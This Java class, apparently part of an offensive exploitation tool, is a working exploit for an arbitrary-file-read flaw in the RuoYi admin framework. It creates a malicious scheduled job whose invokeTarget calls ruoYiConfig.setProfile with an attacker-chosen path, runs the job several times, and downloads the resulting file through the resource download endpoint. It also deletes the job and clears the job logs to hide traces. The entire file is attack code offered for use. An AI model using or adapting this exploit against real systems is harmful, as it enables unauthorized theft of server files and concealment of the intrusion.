package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

import java.util.Random;
import java.util.concurrent.TimeUnit;

public class ruoyi_job_fileread implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('C:/test.log')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String remove_vul_effect_uri = url + "/monitor/job/remove";
        String remove_vul_effect_payload = "ids=" + randomNumber;

        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.post(vul_uri, payload);
            if (res.getBody().contains("操作成功")) {
                req.post(remove_vul_effect_uri, remove_vul_effect_payload);
                return new Result(true, "Ruoyi job fileread漏洞", "[任意文件读取]\nURI:" + vul_uri + "\nDATA:" + payload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi job fileread漏洞", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('" + cmd + "')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String vul_uri1 = url + "/common/download/resource?resource=2.txt";
        String vul_url_run = url + "/monitor/job/run";
        String payload1 = "jobId=" + randomNumber;
        String remove_vul_effect_uri = url + "/monitor/jobLog/clean";

        try {
            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            if (res.contains("操作成功")) {
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    TimeUnit.SECONDS.sleep(3);
                    req.post(remove_vul_effect_uri, "");
                    String res2 = req.get(vul_uri1).getBody();
                    if (res2.isEmpty()) {
                        return new Result(false, null, "读取失败");
                    }
                    return new Result(true, null, res2);
                }
            }
        } catch (Exception e) {
            return new Result(false, null, "执行失败有可能是文件太大，请手动访问:" + vul_uri1);
        }
        return new Result(false, null, "执行失败有可能是文件太大，请手动访问:" + vul_uri1);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}

